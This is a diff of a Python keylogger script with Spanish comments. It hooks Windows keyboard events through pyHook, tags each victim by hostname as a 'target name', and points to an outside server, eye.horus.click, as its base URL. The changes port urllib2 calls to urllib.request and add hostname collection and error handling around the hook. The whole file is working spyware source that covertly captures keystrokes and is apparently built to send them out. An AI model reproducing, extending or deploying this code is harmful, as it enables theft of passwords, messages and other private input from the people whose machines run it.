@@ -2,11 +2,10 @@
     Autor: @SergioRAlvarezP
     Fecha de Inicio: 2019-05-21
     Fecha de término: 2019-06-26
-    Fecha de Actualización: 2019-08-27
+    Fecha de Actualización: 2019-08-30
 '''
 from collections import deque
-import time, datetime, threading
-import pyHook, pythoncom, sys, requests
+import time, threading, subprocess, pyHook, pythoncom, requests, urllib.request
 from requests.exceptions import HTTPError
 
 i=0
@@ -14,9 +13,9 @@ i=0
 '''**Validación Offline**'''
 def internet_on():
     try:
-        urllib2.urlopen('http://216.58.192.142', timeout=1)
+        urllib.request.urlopen('http://216.58.192.142', timeout=1)
         return True
-    except urllib2.URLError as err: 
+    except urllib.error.URLError as err: 
         return False
 '''**Validación Offline**'''
 
@@ -25,7 +24,9 @@ def internet_on():
     en un archivo codificado que solo almacene ese nombre, y que al inicio de cada
     ejecución, se verifique que ese archivo existe, se obtenga el dato o en su defecto
     que se vuelva a solicitar el nombre y se genere nuevamente el archivo'''
-name="prueba2"
+    '''Actualización (V1): El target name se obtiene del hostname del equipo'''
+name = subprocess.run(['hostname'], stdout=subprocess.PIPE)
+name = name.stdout.decode('utf-8').rstrip("\r\n")
 base_url = "https://eye.horus.click/"
 
 def insertar():
@@ -131,8 +132,12 @@ def OnKeyboardEvent(event):
 
 elements = Queue()
 hooks_manager = pyHook.HookManager()
-hooks_manager.KeyDown = OnKeyboardEvent
-hooks_manager.HookKeyboard()
+try:
+    hooks_manager.KeyDown = OnKeyboardEvent
+except Exception as err:
+    print(f'Error: {err}')
+else:
+    hooks_manager.HookKeyboard()
 
 while True:
     pythoncom.PumpWaitingMessages()
